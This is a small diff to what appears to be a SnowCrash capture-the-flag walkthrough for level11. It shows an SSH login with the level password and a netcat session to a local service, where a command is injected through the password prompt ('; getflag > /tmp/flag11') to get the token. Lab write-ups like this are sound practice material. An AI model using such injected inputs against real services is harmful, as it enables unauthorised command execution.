@@ -2,7 +2,7 @@
 └─>  ssh 192.168.1.64 -p 4242 -l level11
 level11@192.168.1.64's password: feulo4b72j7edeahuete3no7c
 level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: ; getflag > /tmp/flag
+Password: ; getflag > /tmp/flag11
 Erf nope..
-level11@SnowCrash:~$ cat /tmp/flag
+level11@SnowCrash:~$ cat /tmp/flag11
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
